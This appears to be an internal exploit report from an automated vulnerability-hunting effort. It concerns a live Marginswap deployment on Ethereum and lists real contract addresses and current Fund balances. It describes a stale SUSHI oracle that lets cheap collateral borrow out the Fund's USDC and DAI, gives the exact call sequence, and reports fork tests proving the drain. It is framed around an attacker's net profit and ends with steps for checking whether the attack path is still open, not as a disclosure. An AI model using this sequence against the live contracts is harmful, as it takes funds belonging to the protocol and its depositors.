# EX-13 — Marginswap: stale SUSHI oracle lets cheap collateral drain the Fund

**Net for an unprivileged actor:** **$11.31** (the Fund's entire USDC + DAI balance)
**Confidence:** HIGH — fork-proven at block 26,401,349
**Gate:** none
**Chain:** Ethereum (1)
**Status:** headline C4 H-06/H-01 are PATCHED; this is a stale-oracle path in the live deployment.

## Contracts

| Role | Address |
|---|---|
| Target (old MarginRouter) | `0x690c6ff4C5DdBAeA4282b109dC145cbA19d13206` |
| Live MarginRouter | `0xb80d5989F2ecB199603740197Ce9223b239547E0` |
| CrossMarginTrading | `0x1c8F8091860450aa5Ec59DE486adBA0Ed5050642` |
| Fund | `0xb73612799734DF92E3bD10898fDf44412815cC04` |
| Roles | `0xC6D13A49cdC5Afc7798dd0eBA7698DB9BFCc1D8c` |

Live Fund: 6.482515 USDC, 6.233396 DAI, 60.488 SUSHI, 5.370 LINK, 3.458 UNI, 10.761 BOND, 25,000 MFI.

## Bug

`PriceAware.getCurrentPriceInPeg(SUSHI)` returns 3.197 USDT from a price record last updated 2022-12-28, while the market price is 0.171259 — an 18.7× overvaluation. `crossDeposit(SUSHI)` credits the inflated collateral; after the 11-block cooling-off, `crossBorrow(USDC/DAI)` and `crossWithdraw` drain the Fund.

## Step-by-step

```
crossDeposit(3.2 SUSHI)          // credited at 3.197 USDT/SUSHI
wait 11 blocks
crossBorrow(6.4825 USDC)
crossWithdraw()                  // Fund USDC -> 15 wei
repeat for DAI (6.2333)
```

## PoC

`stage3/work/S3-282/Marginswap_0x690c6f/poc`

Fork tests at block 26,401,349:

- `test_staleOracleTwoStep` PASS — attacker USDC 0 → 6,482,500; Fund USDC 6,482,515 → 15.
- `test_staleOracleTwoStepDAI` PASS — attacker DAI 0 → 6.2333e18; Fund DAI → 96,291,964,901,115 wei.

## Economics

- Collateral: ~6.3 SUSHI (~$1.08) for 6.4825 USDC + 6.2333 DAI.
- Net $11.31. Fund is small, so the prize is capped.
- HIGH confidence: fork-proven, no role gate.

## Evidence

- `evidence/src/contracts/PriceAware.sol`, `MarginRouter.sol`, `CrossMarginTrading.sol`, `Fund.sol`.
- `evidence/live_state.txt` — Fund balances, `tokenPrices[SUSHI].lastUpdated=1672192427`, price 3,197,433 vs market 0.171259.
- `evidence/poc_run.txt` — forge output.
- Etherscan V2 verified MarginRouter (solc 0.8.3).

## Risks / caveats

- The Fund balance is small; the net is capped at ~$11.
- The oracle must remain stale; if `updatePrice` is called, the path closes.
- The old router is superseded; the exploit uses the live router/Fund roles.

## Handover

1. Re-read `tokenPrices[SUSHI]` and the Fund balances.
2. Re-run the two fork tests at the latest block.
3. If the price is still stale, the path is live; otherwise close.
